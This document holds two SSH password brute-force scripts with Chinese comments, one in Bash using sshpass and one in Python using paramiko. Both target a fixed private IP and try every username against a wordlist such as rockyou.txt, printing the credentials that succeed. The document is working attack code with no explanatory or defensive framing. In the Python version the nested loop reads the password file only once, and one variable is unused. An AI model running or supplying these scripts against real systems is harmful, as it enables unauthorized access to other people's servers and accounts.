
# Bash

```
#!/bin/bash  
  
# 目标服务器的IP地址和SSH端口  
target_ip="192.168.216.144"  
ssh_port=22  
  
# 用户名和密码列表文件  
user_list="users.txt"  
pass_list="passwords.txt"  

# 指定加密类型,不指定则填no
KeyCheck="no"

# 尝试爆破SSH登录的函数  
function try_ssh_login() {  
    local username=$1  
    local password=$2  
    sshpass -p "$password" ssh -o StrictHostKeyChecking=$KeyCheck "$username"@"$target_ip" -p "$ssh_port" &> /dev/null  
    if [ $? -eq 0 ]; then  
        echo "登录成功: $username/$password"  
    fi  
}  
  
# 读取用户名和密码列表文件，并尝试爆破SSH登录  
while IFS= read -r username; do  
    while IFS= read -r password; do  
        try_ssh_login "$username" "$password"  
    done < "$pass_list"  
done < "$user_list"
```

# Python

```
import paramiko  
  
# 目标服务器的IP地址和SSH端口  
target_ip = "192.168.216.144"  
ssh_port = 22  
  
# 用户名和密码列表文件  
user_list = r"./user.list"  
pass_list = r"/usr/share/wordlists/rockyou.txt"  
  
# 指定加密算法  
encryption_algorithm = "aes-256-cbc"  
  
  
# 尝试爆破SSH登录的函数  
def try_ssh_login(username, password):  
    client = paramiko.SSHClient()  
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
    try:  
        client.connect(hostname=target_ip, port=ssh_port, username=username, password=password,  
                       key_filename=None, timeout=10, allow_agent=False, look_for_keys=False,  
                       banner_timeout=10)  
        print(f"登录成功: {username}/{password}")  
        client.close()  
    except paramiko.AuthenticationException:  
        print(f"认证失败: {username}/{password}")  
    except paramiko.SSHException as sshException:  
        print(f"连接失败: {username}/{password} - {sshException}")  
    except Exception as e:  
        print(f"发生错误: {username}/{password} - {e}")  
  
    # 读取用户名和密码列表文件，并尝试爆破SSH登录  
  
  
with open(user_list, 'r') as users, open(pass_list, 'r') as passwords:  
    for username in users:  
        for password in passwords:  
            try_ssh_login(username.strip(), password.strip())
```